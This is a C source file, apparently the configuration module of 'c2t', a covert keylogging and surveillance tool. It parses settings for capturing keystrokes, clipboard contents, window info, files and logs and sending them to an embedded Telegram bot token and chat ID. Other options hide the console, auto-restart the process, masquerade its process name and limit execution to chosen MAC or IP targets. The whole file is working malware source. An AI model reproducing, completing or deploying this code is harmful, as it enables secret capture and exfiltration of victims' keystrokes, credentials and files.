/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "config.h"
#include "embedded_config.h"

#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef __APPLE__
#include <mach-o/dyld.h>
#endif

#define TELEGRAM_DEFAULT_MAX_FILE_BYTES (50U * 1024U * 1024U)
#define TELEGRAM_DEFAULT_LOG_INTERVAL_SEC 3600U
#define TELEGRAM_MIN_LOG_INTERVAL_SEC 5U
#define TELEGRAM_MAX_LOG_INTERVAL_SEC 86400U
#define C2T_DEFAULT_QUEUE_MAX_BYTES (64U * 1024U * 1024U)
#define C2T_DEFAULT_QUEUE_MAX_ITEMS 128U
#define C2T_DEFAULT_DELIVERY_ATTEMPTS 3U
#define C2T_DEFAULT_RETRY_DELAY_MS 500U
#define C2T_MAX_DELIVERY_ATTEMPTS 10U
#define C2T_MAX_RETRY_DELAY_MS 60000U
#define C2T_DEFAULT_KEYBOARD_FLUSH_MS 3000U
#define C2T_MIN_KEYBOARD_FLUSH_MS 500U
#define C2T_MAX_KEYBOARD_FLUSH_MS 60000U

static c2t_config_t config;
static char embedded_bot_token[512];
static char embedded_chat_id[128];
static char embedded_proxy[512];
static char embedded_keyboard_layout[64];
static char embedded_allowed_mac[256];
static char embedded_allowed_ip[256];
#ifdef C2T_ENABLE_PROCESS_MASQUERADE
static char embedded_daemon_name[64];
static char embedded_supervisor_name[64];
#endif

#ifdef __APPLE__
#define C2T_SIDECAR_CAPACITY 4096U
static char sidecar[C2T_SIDECAR_CAPACITY + 1];
static size_t sidecar_length;

static void load_sidecar(const char *executable_path) {
  char executable[4096] = {};
  uint32_t capacity = (uint32_t)sizeof(executable);
  if (_NSGetExecutablePath(executable, &capacity) != 0) {
    if (!executable_path || strlen(executable_path) >= sizeof(executable))
      return;
    memcpy(executable, executable_path, strlen(executable_path) + 1);
  }

  char *separator = strrchr(executable, '/');
  const char suffix[] = "/.c2t.env";
  size_t directory_length = separator ? (size_t)(separator - executable) : 1;
  if (!separator)
    executable[0] = '.';
  if (directory_length + sizeof(suffix) > sizeof(executable))
    return;
  memcpy(executable + directory_length, suffix, sizeof(suffix));

  FILE *stream = fopen(executable, "rb");
  if (!stream)
    return;
  sidecar_length = fread(sidecar, 1, C2T_SIDECAR_CAPACITY, stream);
  int extra = fgetc(stream);
  if (fclose(stream) != 0 || extra != EOF) {
    sidecar_length = 0;
    return;
  }
  sidecar[sidecar_length] = '\0';
}

[[nodiscard]] static int sidecar_get(const char *name, char *output,
                                     size_t capacity) {
  size_t name_length = strlen(name);
  size_t position = 0;
  while (position < sidecar_length) {
    size_t start = position;
    while (position < sidecar_length && sidecar[position] != '\n' &&
           sidecar[position] != '\r')
      ++position;
    size_t length = position - start;
    while (position < sidecar_length &&
           (sidecar[position] == '\n' || sidecar[position] == '\r'))
      ++position;
    if (!length || sidecar[start] == '#')
      continue;
    if (length > name_length && length - name_length <= capacity &&
        sidecar[start + name_length] == '=' &&
        memcmp(sidecar + start, name, name_length) == 0) {
      size_t value_length = length - name_length - 1;
      memcpy(output, sidecar + start + name_length + 1, value_length);
      output[value_length] = '\0';
      return 1;
    }
  }
  return 0;
}
#endif

[[nodiscard]] static const char *
configured_value(const char *name, char *embedded, size_t embedded_capacity) {
  const char *value = getenv(name);
  if (value)
    return value;
#ifdef __APPLE__
  if (sidecar_get(name, embedded, embedded_capacity))
    return embedded;
#endif
  if (c2t_embedded_config_get(name, embedded, embedded_capacity))
    return embedded;
  return nullptr;
}

[[nodiscard]] static int configured_flag(const char *name) {
  char embedded[16] = {};
  const char *value = configured_value(name, embedded, sizeof(embedded));
  return value && *value && strcmp(value, "0") != 0;
}

[[nodiscard]] static size_t configured_size(const char *name, size_t fallback) {
  char embedded[32] = {};
  const char *value = configured_value(name, embedded, sizeof(embedded));
  if (!value || !*value || *value == '-')
    return fallback;

  errno = 0;
  char *end;
  unsigned long long parsed = strtoull(value, &end, 10);
  if (errno || *end || parsed == 0 || parsed > SIZE_MAX)
    return fallback;
  return (size_t)parsed;
}

void c2t_config_load([[maybe_unused]] const char *executable_path) {
#ifdef __APPLE__
  load_sidecar(executable_path);
#endif
  config.verbose = configured_flag("C2T_VERBOSE");
  config.log_file = configured_flag("C2T_LOG_FILE");
  config.auto_restart = configured_flag("C2T_AUTO_RESTART");
  config.hide_console =
      configured_flag("C2T_HIDE_CONSOLE") || configured_flag("HIDE_CONSOLE");
  config.telegram_enabled = configured_flag("TELEGRAM_ENABLED");
  config.telegram_deduplicate = configured_flag("TELEGRAM_DEDUPLICATE");
  config.telegram_send_files = configured_flag("TELEGRAM_SEND_FILES");
  config.telegram_send_window_info =
      configured_flag("TELEGRAM_SEND_WINDOW_INFO");
  config.telegram_send_logs = configured_flag("TELEGRAM_SEND_LOGS");
  config.telegram_log_interval_sec = configured_size(
      "TELEGRAM_LOG_INTERVAL_SEC", TELEGRAM_DEFAULT_LOG_INTERVAL_SEC);
  if (config.telegram_log_interval_sec < TELEGRAM_MIN_LOG_INTERVAL_SEC)
    config.telegram_log_interval_sec = TELEGRAM_MIN_LOG_INTERVAL_SEC;
  if (config.telegram_log_interval_sec > TELEGRAM_MAX_LOG_INTERVAL_SEC)
    config.telegram_log_interval_sec = TELEGRAM_MAX_LOG_INTERVAL_SEC;
  config.telegram_max_file_bytes = configured_size(
      "TELEGRAM_MAX_FILE_BYTES", TELEGRAM_DEFAULT_MAX_FILE_BYTES);
  config.queue_max_bytes =
      configured_size("C2T_QUEUE_MAX_BYTES", C2T_DEFAULT_QUEUE_MAX_BYTES);
  config.queue_max_items =
      configured_size("C2T_QUEUE_MAX_ITEMS", C2T_DEFAULT_QUEUE_MAX_ITEMS);
  config.delivery_attempts =
      configured_size("C2T_DELIVERY_ATTEMPTS", C2T_DEFAULT_DELIVERY_ATTEMPTS);
  if (config.delivery_attempts > C2T_MAX_DELIVERY_ATTEMPTS)
    config.delivery_attempts = C2T_MAX_DELIVERY_ATTEMPTS;
  config.retry_delay_ms =
      configured_size("C2T_RETRY_DELAY_MS", C2T_DEFAULT_RETRY_DELAY_MS);
  if (config.retry_delay_ms > C2T_MAX_RETRY_DELAY_MS)
    config.retry_delay_ms = C2T_MAX_RETRY_DELAY_MS;
  char embedded_send_kb[16] = {};
  const char *send_kb_val = configured_value(
      "TELEGRAM_SEND_KEYBOARD", embedded_send_kb, sizeof(embedded_send_kb));
  if (send_kb_val) {
    config.disable_keyboard = strcmp(send_kb_val, "0") == 0;
  } else {
    config.disable_keyboard = configured_flag("C2T_DISABLE_KEYBOARD") ||
                              configured_flag("DISABLE_KEYBOARD");
  }
  char embedded_send_clip[16] = {};
  const char *send_clip_val =
      configured_value("TELEGRAM_SEND_CLIPBOARD", embedded_send_clip,
                       sizeof(embedded_send_clip));
  if (send_clip_val) {
    config.disable_clipboard = strcmp(send_clip_val, "0") == 0;
  } else {
    config.disable_clipboard = configured_flag("C2T_DISABLE_CLIPBOARD") ||
                               configured_flag("DISABLE_CLIPBOARD");
  }
  config.keyboard_flush_ms =
      configured_size("C2T_KEYBOARD_FLUSH_MS", C2T_DEFAULT_KEYBOARD_FLUSH_MS);
  if (config.keyboard_flush_ms < C2T_MIN_KEYBOARD_FLUSH_MS)
    config.keyboard_flush_ms = C2T_MIN_KEYBOARD_FLUSH_MS;
  if (config.keyboard_flush_ms > C2T_MAX_KEYBOARD_FLUSH_MS)
    config.keyboard_flush_ms = C2T_MAX_KEYBOARD_FLUSH_MS;
  config.keyboard_shortcuts = configured_flag("C2T_KEYBOARD_SHORTCUTS") ||
                              configured_flag("KEYBOARD_SHORTCUTS") ||
                              configured_flag("TELEGRAM_KEYBOARD_SHORTCUTS");
#ifdef C2T_ENABLE_PROCESS_MASQUERADE
  config.daemon_name = configured_value("C2T_DAEMON_NAME", embedded_daemon_name,
                                        sizeof(embedded_daemon_name));
  if (!config.daemon_name || !*config.daemon_name)
    config.daemon_name = "c2t";
  config.supervisor_name =
      configured_value("C2T_SUPERVISOR_NAME", embedded_supervisor_name,
                       sizeof(embedded_supervisor_name));
  if (!config.supervisor_name || !*config.supervisor_name)
    config.supervisor_name = "t2c";
#endif
  config.keyboard_layout =
      configured_value("C2T_KEYBOARD_LAYOUT", embedded_keyboard_layout,
                       sizeof(embedded_keyboard_layout));
  if (!config.keyboard_layout || !*config.keyboard_layout) {
    config.keyboard_layout =
        configured_value("TELEGRAM_KEYBOARD_LAYOUT", embedded_keyboard_layout,
                         sizeof(embedded_keyboard_layout));
  }
  if (!config.keyboard_layout || !*config.keyboard_layout) {
    config.keyboard_layout =
        configured_value("KEYBOARD_LAYOUT", embedded_keyboard_layout,
                         sizeof(embedded_keyboard_layout));
  }
  if (config.keyboard_layout && !*config.keyboard_layout)
    config.keyboard_layout = nullptr;
  config.telegram_bot_token = configured_value(
      "TELEGRAM_BOT_TOKEN", embedded_bot_token, sizeof(embedded_bot_token));
  config.telegram_chat_id = configured_value(
      "TELEGRAM_CHAT_ID", embedded_chat_id, sizeof(embedded_chat_id));
  config.proxy =
      configured_value("C2T_PROXY", embedded_proxy, sizeof(embedded_proxy));
  if (!config.proxy || !*config.proxy) {
    config.proxy = configured_value("TELEGRAM_PROXY", embedded_proxy,
                                    sizeof(embedded_proxy));
  }
  if (config.proxy && !*config.proxy)
    config.proxy = nullptr;
  config.allowed_mac = configured_value(
      "C2T_ALLOWED_MAC", embedded_allowed_mac, sizeof(embedded_allowed_mac));
  if (!config.allowed_mac || !*config.allowed_mac) {
    config.allowed_mac = configured_value(
        "ALLOWED_MAC", embedded_allowed_mac, sizeof(embedded_allowed_mac));
  }
  if (config.allowed_mac && !*config.allowed_mac)
    config.allowed_mac = nullptr;
  config.allowed_ip = configured_value(
      "C2T_ALLOWED_IP", embedded_allowed_ip, sizeof(embedded_allowed_ip));
  if (!config.allowed_ip || !*config.allowed_ip) {
    config.allowed_ip = configured_value(
        "ALLOWED_IP", embedded_allowed_ip, sizeof(embedded_allowed_ip));
  }
  if (config.allowed_ip && !*config.allowed_ip)
    config.allowed_ip = nullptr;
}

void c2t_config_load_environment(void) { c2t_config_load(nullptr); }

const char *c2t_config_apply_arguments(int argc, char **argv) {
  for (int index = 1; index < argc; ++index) {
    if (strcmp(argv[index], "-v") == 0 ||
        strcmp(argv[index], "--verbose") == 0) {
      config.verbose = 1;
    } else if (strcmp(argv[index], "-l") == 0 ||
               strcmp(argv[index], "--log-file") == 0 ||
               strcmp(argv[index], "--save-logs") == 0) {
      config.log_file = 1;
    } else if (strcmp(argv[index], "--auto-restart") == 0 ||
               strcmp(argv[index], "--auto-respawn") == 0) {
      config.auto_restart = 1;
    } else if (strcmp(argv[index], "--no-auto-restart") == 0 ||
               strcmp(argv[index], "--no-supervisor") == 0 ||
               strcmp(argv[index], "--single-process") == 0) {
      config.auto_restart = 0;
    } else if (strcmp(argv[index], "--hide-console") == 0 ||
               strcmp(argv[index], "--hidden") == 0 ||
               strcmp(argv[index], "-H") == 0) {
      config.hide_console = 1;
    } else if (strcmp(argv[index], "--daemon-worker") == 0) {
      config.is_worker = 1;
    } else if (strcmp(argv[index], "--send-files") == 0) {
      config.telegram_send_files = 1;
    } else if (strcmp(argv[index], "--send-window-info") == 0) {
      config.telegram_send_window_info = 1;
    } else if (strcmp(argv[index], "--send-logs") == 0 ||
               strcmp(argv[index], "--telegram-send-logs") == 0) {
      config.telegram_send_logs = 1;
    } else if (strcmp(argv[index], "--no-keyboard") == 0 ||
               strcmp(argv[index], "--disable-keyboard") == 0) {
      config.disable_keyboard = 1;
    } else if (strcmp(argv[index], "--send-keyboard") == 0 ||
               strcmp(argv[index], "--enable-keyboard") == 0) {
      config.disable_keyboard = 0;
    } else if (strcmp(argv[index], "--no-clipboard") == 0 ||
               strcmp(argv[index], "--disable-clipboard") == 0) {
      config.disable_clipboard = 1;
    } else if (strcmp(argv[index], "--send-clipboard") == 0 ||
               strcmp(argv[index], "--enable-clipboard") == 0) {
      config.disable_clipboard = 0;
    } else if (strcmp(argv[index], "--keyboard-shortcuts") == 0 ||
               strcmp(argv[index], "--shortcuts") == 0 ||
               strcmp(argv[index], "--enable-shortcuts") == 0) {
      config.keyboard_shortcuts = 1;
    } else if (strcmp(argv[index], "--no-keyboard-shortcuts") == 0 ||
               strcmp(argv[index], "--no-shortcuts") == 0 ||
               strcmp(argv[index], "--disable-shortcuts") == 0) {
      config.keyboard_shortcuts = 0;
    } else if (strcmp(argv[index], "--keyboard-layout") == 0 ||
               strcmp(argv[index], "--layout") == 0) {
      if (index + 1 >= argc)
        return argv[index];
      ++index;
      config.keyboard_layout = argv[index];
    } else if (strcmp(argv[index], "--proxy") == 0 ||
               strcmp(argv[index], "--proxy-url") == 0) {
      if (index + 1 >= argc)
        return argv[index];
      ++index;
      config.proxy = argv[index];
#ifdef C2T_ENABLE_PROCESS_MASQUERADE
    } else if (strcmp(argv[index], "--daemon-name") == 0 ||
               strcmp(argv[index], "--process-name") == 0) {
      if (index + 1 >= argc)
        return argv[index];
      ++index;
      config.daemon_name = argv[index];
    } else if (strcmp(argv[index], "--supervisor-name") == 0) {
      if (index + 1 >= argc)
        return argv[index];
      ++index;
      config.supervisor_name = argv[index];
#endif
    } else if (strcmp(argv[index], "--keyboard-flush-ms") == 0 ||
               strcmp(argv[index], "--keyboard-flush") == 0) {
      if (index + 1 >= argc)
        return argv[index];
      ++index;
      char *end;
      errno = 0;
      unsigned long val = strtoul(argv[index], &end, 10);
      if (errno || *end || val < C2T_MIN_KEYBOARD_FLUSH_MS ||
          val > C2T_MAX_KEYBOARD_FLUSH_MS)
        return argv[index - 1];
      config.keyboard_flush_ms = (size_t)val;
    } else if (strcmp(argv[index], "--log-interval") == 0 ||
               strcmp(argv[index], "--telegram-log-interval") == 0) {
      if (index + 1 >= argc)
        return argv[index];
      ++index;
      char *end;
      errno = 0;
      unsigned long val = strtoul(argv[index], &end, 10);
      if (errno || *end || val < TELEGRAM_MIN_LOG_INTERVAL_SEC ||
          val > TELEGRAM_MAX_LOG_INTERVAL_SEC)
        return argv[index - 1];
      config.telegram_log_interval_sec = (size_t)val;
    } else if (strcmp(argv[index], "--allowed-mac") == 0) {
      if (index + 1 >= argc)
        return argv[index];
      ++index;
      config.allowed_mac = argv[index];
    } else if (strcmp(argv[index], "--allowed-ip") == 0) {
      if (index + 1 >= argc)
        return argv[index];
      ++index;
      config.allowed_ip = argv[index];
    } else {
      return argv[index];
    }
  }
  return nullptr;
}

static char dynamic_chat_id[128];

void c2t_config_set_chat_id(const char *chat_id) {
  if (!chat_id)
    return;
  snprintf(dynamic_chat_id, sizeof(dynamic_chat_id), "%s", chat_id);
  config.telegram_chat_id = dynamic_chat_id;
}

const c2t_config_t *c2t_config_get(void) { return &config; }
